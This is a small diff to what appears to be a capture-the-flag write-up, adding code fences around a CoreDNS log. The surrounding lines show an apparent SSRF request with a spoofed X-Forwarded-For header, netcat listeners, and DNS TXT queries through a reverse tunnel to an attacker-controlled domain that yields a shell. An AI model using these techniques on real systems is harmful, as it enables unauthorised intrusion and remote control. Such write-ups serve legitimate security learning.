@@ -46,7 +46,7 @@ curl -H "X-Forwarded-For: 95.173.136.71" kgb.target:15555/scan?url=http://0x0y0z
 nc localhost 1337
 
 In coredns you'll know when the reverse tunnel works when you see requests coming in
-
+```
 [INFO] 162.158.104.220:34913 - 24862 "TXT IN 2420-0-660faeac.tunnel.yourdomain.com. udp 63 true 1452" NOERROR qr,aa 100 0.000447496s
 [INFO] 162.158.104.148:59983 - 7850 "TXT IN 00-1-2317440.tunnel.yourdomain.com. udp 60 true 1452" NOERROR qr,aa 94 0.000248969s
 [INFO] 162.158.104.148:22594 - 53984 "TXT IN 00-2-5d586564.tunnel.yourdomain.com. udp 61 true 1452" NOERROR qr,aa 96 0.000110636s
@@ -54,6 +54,7 @@ In coredns you'll know when the reverse tunnel works when you see requests comin
 [INFO] 162.158.104.149:65071 - 57369 "TXT IN 00-4-22e00cc.tunnel.yourdomain.com. udp 60 true 1452" NOERROR qr,aa 94 0.000239648s
 [INFO] 162.158.104.148:29410 - 15723 "TXT IN 00-5-6c60fe9a.tunnel.yourdomain.com. udp 61 true 1452" NOERROR qr,aa 96 0.00022385s
 [INFO] 162.158.104.220:46404 - 39031 "TXT IN 00-6-4aae60dc.tunnel.yourdomain.com. udp 61 true 1452" NOERROR qr,aa 96 0.000100155s
+```
 
 ```
 bash-3.2# nc localhost 1337
